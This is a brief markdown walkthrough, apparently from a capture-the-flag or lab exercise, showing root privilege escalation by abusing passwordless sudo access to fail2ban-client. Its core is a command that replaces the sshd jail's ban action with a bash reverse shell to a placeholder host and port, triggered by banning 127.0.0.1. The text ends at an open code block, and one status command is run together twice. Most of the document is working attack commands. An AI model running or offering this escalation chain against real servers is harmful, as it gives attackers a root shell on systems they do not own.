# Fail2ban
## fail2ban-client is the command-line tool used to interact with Fail2Ban, a security program that protects Linux servers from brute-force attacks.

No password to run fail2ban client
<img width="1035" height="244" alt="image" src="https://github.com/user-attachments/assets/1b41de2e-43e9-480d-9b71-6a38c49e21a4" />

## All the attacks are in jail
```
sudo /usr/bin/fail2ban-client statussudo /usr/bin/fail2ban-client status
```
<img width="1620" height="108" alt="image" src="https://github.com/user-attachments/assets/a59554ea-2685-4c18-934b-9342373f8ddd" />

## This command modifies the actionban rule for the sshd jail, replacing the default IP banning action with a reverse shell payload.<br>Normally, Fail2Ban executes the iptables-multiport action to ban IP addresses attempting brute-force attacks. However, by injecting my command, I ensure that instead of banning an IP, 
Fail2Ban will execute my reverse shell.

```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"
```
## Lastly, I executed the following command:

```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

## Listen the port and get the root access
```

